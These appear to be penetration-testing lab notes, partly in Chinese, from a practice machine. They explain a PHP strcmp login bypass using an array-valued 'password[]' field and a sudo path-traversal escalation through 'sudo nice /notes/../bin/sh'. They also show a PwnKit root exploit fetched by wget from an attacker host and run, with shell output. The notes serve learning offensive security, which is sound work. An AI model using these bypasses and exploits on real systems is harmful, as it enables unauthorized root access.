![[Pasted image 20250925113547.png]]
![[Pasted image 20250925115707.png]]
Php 5.3 strcmp
if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
- `if($_GET['login']==="1"){`
    
    - 检查 URL 查询参数 `login` 是否严格等于字符串 `"1"`。
        
    - 例如访问 `index.php?login=1` 时这个条件为真。
        
    - 问题：用 `GET` 来触发登录流程不太合适，登录应通过 `POST` 提交的表单/请求来触发（更符合语义，也更不容易无意触发）。
        
- `if (strcmp($_POST['username'], "admin") == 0 && strcmp($_POST['password'], $pass) == 0) {`
    
    - 比较两个条件都为真时进入分支：
        
        - `strcmp($_POST['username'], "admin") == 0`：检查提交的 `username` 是否等于 `"admin"`（字符串精确比较）。
            
        - `strcmp($_POST['password'], $pass) == 0`：比较提交的密码 `$_POST['password']` 与变量 `$pass`（假设是存着的密码）是否相等。
            
    - 注意 `strcmp()` 返回 0 表示相等。
    - strcmp(string $str1, string $str2): int
比较两个字符串的二进制值（区分大小写，逐字节比较）。

返回值：

0 → 两个字符串相等

<0 → $str1 小于 $str2

>0 → $str1 大于 $str2
        
    - 问题 & 漏洞（很多）：
        
        - 看起来 `$pass` 可能是**明文密码**，如果是这样就非常不安全（不应该在代码或配置里存明文密码）。
            
        - 没有对 `$_POST['username']` 和 `$_POST['password']` 做 `isset()` 或类型检查。如果攻击者发送 `password[]`（数组）、空值或没有字段，可能触发意外行为或警告。
            
        - `strcmp()` 不是抗时序攻击（timing attack）的函数；如果在比较散列时应使用 `hash_equals()`。不过更好的做法是使用 `password_hash()` / `password_verify()`。
            
        - 如果 `$_POST['password']` 是数组（例如 `password[]`），PHP 会发出 warning 并把数组在字符串上下文下转换为 `"Array"`，这会导致比较结果异常（可被滥用）。
## 为什么 `username=admin&password[]=123` 会“奏效”（简明原因）

1. **`password[]` 在 PHP 中变成数组**  
    当你发送 `password[]=123`，PHP 会把 `$_POST['password']` 设为数组（`array(0 => "123")`），**而不是字符串**。
    
2. **代码期待字符串但没做类型检查**  
    你原来的代码里直接这样用：
    
    `strcmp($_POST['password'], $pass)`
    
    `strcmp()` 是一个**字符串函数**，它期望两个参数都是字符串。但如果把一个数组传进去，PHP 会触发“数组到字符串的转换”警告（warning）。
    
3. **数组在字符串上下文会被转换为 `"Array"`（并发出 warning）**  
    在把数组当作字符串使用时，PHP 会把它转换成字面串 `"Array"`（同时在错误日志/响应里会有 warning）。因此 `strcmp($_POST['password'], $pass)` 实际上比较的可能是 `"Array"` vs `$pass`。
    
    - 如果 `$pass` 恰好等于 `"Array"`（或也以某种方式变成了相同的字符串），比较就会返回相等，从而“绕过”了本来应有的密码检查。
        
    - 即使 `$pass` 不是 `"Array"`，由于没有对输入类型做严格检查，逻辑可能会因为 PHP 的类型混淆或错误处理路径而表现出“奇怪”的结果（比如跳过某些分支、报错但依然继续后续代码等），这都能被滥用。
        
4. **总结**：问题核心是 **没有验证 `$_POST['password']` 的类型/存在性**，并且把**敏感比较交给字符串函数**而未做防护。攻击者通过发送`password[]`（数组）触发类型混淆，从而可能导致登录逻辑出错或绕过验证。

sudo -l
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*
sudo nice /notes/../bin/sh
#root 

## 结论（一句话）

`sudu -l` 显示 `webadmin` 被允许以 root 身份运行 `/bin/nice /notes/*`，利用命令参数里写 `../`（路径穿越）可以执行系统的 `/bin/sh`，从而**获得 root shell**。

分析要点：

/notes/../bin/sh 这个字符串以 /notes/ 开头，因此字面上匹配了 /notes/* 的通配规则（sudo 在匹配 sudoers 允许的命令参数时使用的是命令行参数的字面匹配，而不是先把路径规范化为真实路径）。

/notes/../bin/sh 在文件系统语义上等价于 /bin/sh（路径规范化后会变为 /bin/sh），所以被当作参数传给 /bin/nice，最终 /bin/nice 会 执行该路径对应的可执行文件，也就是系统的 /bin/sh。

因为你是用 sudo 调用了 /bin/nice，/bin/sh 就在 root 权限上下文中被执行 —— 因而得到一个 root shell（id 会显示 uid=0）。

因此，这不是 nice 本身“给特权”的问题，而是 sudoers 的通配符规则与路径未规范化匹配造成的特权绕过。

/notes/../bin/sh
/notes/ 是当前路径

.. 上一级目录 /

/notes/../bin/sh 解析后就是 /bin/sh

这就是为什么能通过 sudoers 的 /notes/* 字面匹配，但实际上执行系统的 /bin/sh，获得 root 权限。

使用 sudo 或 su 运行
$ sudo bash
root@hostname:/home/user#

$ sudo sh
root@hostname:/home/user#


shell 继承 root 权限

可以执行任何系统命令（慎用）

提示符通常是 #

since linpeas suggest pwnkit, so

webadmin@serv:~$ chmod +x PwnKit
webadmin@serv:~$ ./PwnKit
root@serv:/home/webadmin# WHOAMI
WHOAMI: command not found
root@serv:/home/webadmin# id
uid=0(root) gid=0(root) groups=0(root),1001(webadmin)
root@serv:/home/webadmin#
or 
--2025-09-25 20:25:27--  http://192.168.45.248:8000/pwnkit.sh
Connecting to 192.168.45.248:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 150 [application/x-shellscript]
Saving to: ‘pwnkit.sh’

pwnkit.sh                    100%[============================================>]     150  --.-KB/s    in 0s

2025-09-25 20:25:28 (22.7 MB/s) - ‘pwnkit.sh’ saved [150/150]

webadmin@serv:~$ chmod +x pwnkit.sh
webadmin@serv:~$ ./pwnkit.sh
root@serv:/home/webadmin#